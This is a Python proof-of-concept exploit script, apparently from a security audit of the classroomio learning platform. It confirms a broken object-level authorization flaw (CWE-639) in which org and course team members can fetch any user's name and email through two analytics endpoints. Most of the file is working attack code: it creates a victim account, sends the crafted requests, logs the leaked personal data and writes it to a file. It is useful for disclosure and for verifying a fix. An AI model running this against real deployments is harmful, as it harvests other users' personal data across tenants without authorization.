#!/usr/bin/env python3
"""
VULN-015 (AC-5) — Arbitrary-user PII oracle via the analytics endpoints: the path :userId is
                  never reconciled with the caller's authorized org/course.

Vulnerable code (targets/classroomio/):
  * org route:   apps/api/src/routes/organization/organization.ts:471-493
                 (.get('/audience/:userId/analytics', authMiddleware, orgTeamMemberMiddleware, ...))
  * org service: apps/api/src/services/organization.ts:998-1094  (getUserAnalytics)
  * course route: apps/api/src/routes/course/people.ts:172-194
                 (.get('/:userId/analytics', courseTeamMemberMiddleware, ...))
  * course svc:  packages/core/src/services/course/course.ts:724-803  (getUserCourseAnalytics)
  * common sink: both call getProfileById(userId) — a GLOBAL, unscoped profile lookup — and return
                 fullName / email / avatarUrl / lastSeen with NO membership filter.

Class: CWE-639 BOLA (object-level authorization missing on a userId lookup).

The flaw: the routes gate on being a TEAM member of the org/course (orgTeamMemberMiddleware admits
ADMIN or TUTOR — org-team-member.ts:44; courseTeamMemberMiddleware admits any course team member or
org admin), but they pass the raw path :userId straight into getProfileById() with nothing tying that
userId to the caller's org/course. So a team member of ONE scope resolves ANY platform userId to that
account's name + email (cross-tenant in cloud) — a global de-anonymization / PII-harvest oracle.

Exploitation idea: a team member requests analytics for a userId that is NOT a member of their
org/course (here: a freshly-created account with empty orgRoles) and receives its email.

Success proof: both analytics endpoints return the exact email of a victim account that is provably
NOT a member of the caller's org (orgRoles == {}) and NOT enrolled in the caller's course.
"""
import os
import sys
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (log, banner, verdict, admin_login, signup, create_course, make_student,  # noqa: E402
                     ROLE, ORG_ID, rid)

VULN = "VULN-015"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN, "Arbitrary-user PII oracle via analytics (:userId never scoped)")
    log("INFO", "org route organization.ts:471 gated by orgTeamMemberMiddleware (ADMIN|TUTOR)")
    log("INFO", "course route people.ts:172 gated by courseTeamMemberMiddleware (course team | org admin)")
    log("INFO", "both call getProfileById(:userId) with NO membership filter -> arbitrary PII")

    # --- Caller: a bona-fide team member of exactly one org/course. The admin qualifies via
    #     orgTeamMemberMiddleware; a TUTOR (roleId 2) passes the identical gate (org-team-member.ts:44). ---
    log("SETUP", "caller = an org team member (admin); org course it owns")
    admin = admin_login()
    course = create_course(admin, title=f"Caller Course {rid('c')}")
    caller_course = course["id"]
    log("SETUP", f"caller course = {caller_course}")

    # --- Victim: a fresh account that never joined the org (empty orgRoles) and is NOT enrolled
    #     in the caller's course. Its PII must be unreachable via these org/course-scoped endpoints. ---
    log("SETUP", "victim = a fresh unrelated account (NOT a member of the caller's org/course)")
    victim = signup(label="pii-victim")
    vid = (victim.user or {}).get("id")
    vemail = victim.email
    vroles = victim.org_roles()
    log("SETUP", f"victim user={vid} email={vemail} orgRoles={vroles}  (empty => not in the org)")
    if vroles:
        log("INFO", "  warning: victim unexpectedly has org roles; leak below is still cross-scope for the course")

    results = {}

    # --- Attack 1: org audience analytics for a non-member userId ---
    log("STEP", f"GET /organization/audience/{vid}/analytics  (victim is NOT in the org's audience)")
    r1 = admin.get(f"/organization/audience/{vid}/analytics", org=True)
    u1 = (r1.json().get("data", {}) or {}).get("user", {}) if r1.status_code == 200 else {}
    log("INFO", f"  HTTP {r1.status_code}  leaked user = {u1}")
    results["org_audience"] = {"status": r1.status_code, "user": u1}
    leak1 = r1.status_code == 200 and u1.get("email") == vemail

    # --- Attack 2: course members analytics for a userId NOT enrolled in the caller's course ---
    log("STEP", f"GET /course/{caller_course}/members/{vid}/analytics  (victim is NOT enrolled)")
    r2 = admin.get(f"/course/{caller_course}/members/{vid}/analytics", org=True)
    u2 = (r2.json().get("data", {}) or {}).get("user", {}) if r2.status_code == 200 else {}
    log("INFO", f"  HTTP {r2.status_code}  leaked user = {u2}")
    results["course_members"] = {"status": r2.status_code, "user": u2}
    leak2 = r2.status_code == 200 and u2.get("email") == vemail

    # --- Negative control: a STUDENT is NOT a team member, so the gate rejects it (403).
    #     This shows the endpoint IS access-controlled — the bug is the unconstrained :userId,
    #     reachable by the lowest TEAM role (TUTOR), not a wide-open route. ---
    log("STEP", "negative control: a STUDENT session hits the org endpoint (must be 403 — gate is real)")
    try:
        stu, _info = make_student(admin)
        rc = stu.get(f"/organization/audience/{vid}/analytics", org=True)
        log("INFO", f"  STUDENT GET /organization/audience/... -> HTTP {rc.status_code} "
                    f"(403 expected: students are not team members; ADMIN/TUTOR pass)")
        results["student_control"] = rc.status_code
    except Exception as e:
        log("INFO", f"  (student control skipped: {e})")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"victim userId = {vid}\nvictim email = {vemail}\nvictim orgRoles = {vroles}  (not an org member)\n\n")
        f.write(f"GET /organization/audience/{vid}/analytics -> HTTP {results['org_audience']['status']}\n")
        f.write("  data.user = " + json.dumps(results["org_audience"]["user"], default=str) + "\n\n")
        f.write(f"GET /course/{caller_course}/members/{vid}/analytics -> HTTP {results['course_members']['status']}\n")
        f.write("  data.user = " + json.dumps(results["course_members"]["user"], default=str) + "\n\n")
        f.write(f"negative control (STUDENT on org endpoint) -> HTTP {results.get('student_control')}\n")

    if leak1 and leak2:
        log("PROOF", f"both analytics endpoints returned the exact email {vemail!r} of an account with "
                     f"empty orgRoles (not in the org) that is not enrolled in the caller's course — "
                     f"the :userId path param is a global PII oracle")
        verdict(VULN, "CONFIRMED", "analytics endpoints resolve any userId to name+email (BOLA)")
        log("OK", "exploit confirmed — arbitrary-user email disclosure via analytics")
        sys.exit(0)

    verdict(VULN, "FAILED", f"org_leak={leak1} course_leak={leak2}")
    log("FAIL", "expected both endpoints to leak the non-member victim's email")
    sys.exit(1)


if __name__ == "__main__":
    main()
